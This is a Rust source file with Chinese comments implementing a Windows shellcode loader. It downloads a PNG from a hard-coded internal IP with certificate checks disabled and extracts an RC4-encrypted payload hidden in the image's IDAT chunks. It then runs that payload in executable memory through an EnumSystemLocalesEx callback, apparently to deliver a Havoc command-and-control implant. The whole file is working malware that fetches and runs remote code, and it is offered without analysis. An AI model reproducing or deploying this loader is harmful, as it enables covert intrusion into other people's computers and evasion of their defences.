// #![windows_subsystem = "windows"]
use std::ptr::{null, null_mut};
use windows::Win32::{
    System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
    Globalization::{EnumSystemLocalesEx, LOCALE_ALL},
};
use reqwest;
use std::io;

/// 常量定义
const RC4_KEY_SIZE: usize = 16;                 // RC4 密钥长度
const CHUNK_TYPE_SIZE: usize = 4;               // chunk 类型长度
const BYTES_TO_SKIP: usize = 33;                // PNG 头部要跳过的字节数（签名 + IHDR）
const PNG_SIGNATURE: u32 = 0x89504E47;          // PNG 文件签名
const IEND_HASH: u32 = 0xAE426082;              // IEND chunk 的 CRC32 哈希
const MARKED_IDAT_HASH: u32 =    0x43D3839A;    // 标记 IDAT chunk 的 CRC32 哈希

fn main() {
    match download_png() {
        Ok(png) => {
            println!("下载成功，数据大小: {} 字节", png.len());
            
            match extract_decrypted_payload(png) {
                Ok(shellcode) => {
                    println!("解密成功，shellcode 大小: {} 字节", shellcode.len());
                    
                    // 检查 shellcode 大小是否合理
                    if shellcode.len() < 10 || shellcode.len() > 1024 * 1024 {  // 1MB 上限
                        println!("Shellcode 大小异常");
                        return;
                    }

                    unsafe {
                        let address = VirtualAlloc(
                            Some(null_mut()),
                            shellcode.len(),
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE,
                        );

                        if address.is_null() {
                            println!("内存分配失败");
                            return;
                        }

                        std::ptr::copy_nonoverlapping(
                            shellcode.as_ptr(),
                            address as *mut u8,
                            shellcode.len()
                        );

                        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
                        if let Err(e) = VirtualProtect(
                            address, 
                            shellcode.len(), 
                            PAGE_EXECUTE_READWRITE, 
                            &mut old_protection
                        ) {
                            println!("VirtualProtect 失败: {:?}", e);
                            return;
                        }

                        println!("准备执行 shellcode...");
                        
                        if let Err(e) = std::panic::catch_unwind(|| {
                            EnumSystemLocalesEx(
                                std::mem::transmute(address),
                                LOCALE_ALL,
                                std::mem::transmute(0_u64),
                                Some(null())
                            )
                        }) {
                            println!("执行时发生崩溃: {:?}", e);
                            return;
                        }
                    }
                }
                Err(e) => println!("解密失败: {}", e),
            }
        }
        Err(e) => println!("下载错误: {}", e),
    }

}

fn download_png() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // 创建阻塞式 HTTP 客户端
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    // 发起阻塞式 GET 请求
    let response = client
        .get("http://192.168.113.128:8001/havoc.png")
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .send()?;

    // 检查响应状态
    if !response.status().is_success() {
        return Err(format!("HTTP error: {}", response.status()).into());
    }

    // 读取响应体
    Ok(response.bytes()?.to_vec())
}


fn extract_decrypted_payload(png_file_buffer: Vec<u8>) -> io::Result<Vec<u8>> {
    // 验证 PNG 签名
    if png_file_buffer.len() < 4 || u32::from_be_bytes([png_file_buffer[0], png_file_buffer[1], png_file_buffer[2], png_file_buffer[3]]) != PNG_SIGNATURE {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "Not a PNG file"));
    }

    // 初始化变量
    let mut offset = BYTES_TO_SKIP; // 跳过 PNG 头部
    let mut found_hash = false;     // 是否找到标记 chunk
    let mut decrypted_payload = Vec::new(); // 存储解密后的 payload

    // 遍历 PNG chunk
    while offset < png_file_buffer.len() {
        if offset + 8 > png_file_buffer.len() {
            break; // 防止越界
        }

        // 读取 chunk 长度
        let section_length = u32::from_be_bytes([
            png_file_buffer[offset],
            png_file_buffer[offset + 1],
            png_file_buffer[offset + 2],
            png_file_buffer[offset + 3],
        ]) as usize;
        offset += 4;

        // 读取 chunk 类型（跳过）
        offset += CHUNK_TYPE_SIZE;

        if offset + section_length + 4 > png_file_buffer.len() {
            break; // 防止越界
        }

        // 读取 chunk 数据
        let section_buffer = &png_file_buffer[offset..offset + section_length];
        offset += section_length;

        // 读取 CRC32 哈希
        let crc32_hash = u32::from_be_bytes([
            png_file_buffer[offset],
            png_file_buffer[offset + 1],
            png_file_buffer[offset + 2],
            png_file_buffer[offset + 3],
        ]);
        offset += 4;

        // 检查 IEND chunk，结束遍历
        if crc32_hash == IEND_HASH {
            break;
        }

        // 检查标记 chunk
        if crc32_hash == MARKED_IDAT_HASH {
            found_hash = true;
            continue;
        }

        // 如果找到标记 chunk，则提取并解密后续数据
        if found_hash {
            if section_length < RC4_KEY_SIZE {
                continue; // 数据长度不足以包含密钥
            }

            let rc4_key = &section_buffer[..RC4_KEY_SIZE]; // 前 16 字节是密钥
            let encrypted_data = &section_buffer[RC4_KEY_SIZE..]; // 剩余字节是加密数据

            // 使用 RC4 解密
            let decrypted_data = rc4_encrypt_decrypt(encrypted_data, rc4_key);
            decrypted_payload.extend_from_slice(&decrypted_data);
        }
    }

    // 检查是否找到标记 chunk
    if !found_hash {
        return Err(io::Error::new(io::ErrorKind::NotFound, "Marked IDAT hash not found"));
    }

    Ok(decrypted_payload)
}

/// RC4 加密/解密结构
struct Rc4 {
    s: [u8; 256], // S 盒
    i: u8,        // 索引 i
    j: u8,        // 索引 j
}

impl Rc4 {
    /// 使用密钥初始化 RC4 状态
    fn new(key: &[u8]) -> Rc4 {
        let mut s = [0u8; 256];
        // 初始化 S 盒为 0 到 255
        for i in 0..256 {
            s[i] = i as u8;
        }
        let mut j = 0u8;
        // 密钥调度算法 (KSA)
        for i in 0..256 {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }
        Rc4 { s, i: 0, j: 0 }
    }

    /// 处理输入数据，生成加密或解密后的输出
    fn process(&mut self, input: &[u8], output: &mut [u8]) {
        for (in_byte, out_byte) in input.iter().zip(output.iter_mut()) {
            self.i = self.i.wrapping_add(1);
            self.j = self.j.wrapping_add(self.s[self.i as usize]);
            self.s.swap(self.i as usize, self.j as usize);
            let k = self.s[(self.s[self.i as usize] as usize + self.s[self.j as usize] as usize) % 256];
            *out_byte = in_byte ^ k; // 异或生成密钥流
        }
    }
}

/// RC4 加密/解密函数
fn rc4_encrypt_decrypt(input: &[u8], key: &[u8]) -> Vec<u8> {
    let mut rc4 = Rc4::new(key);
    let mut output = vec![0; input.len()];
    rc4.process(input, &mut output);
    output
}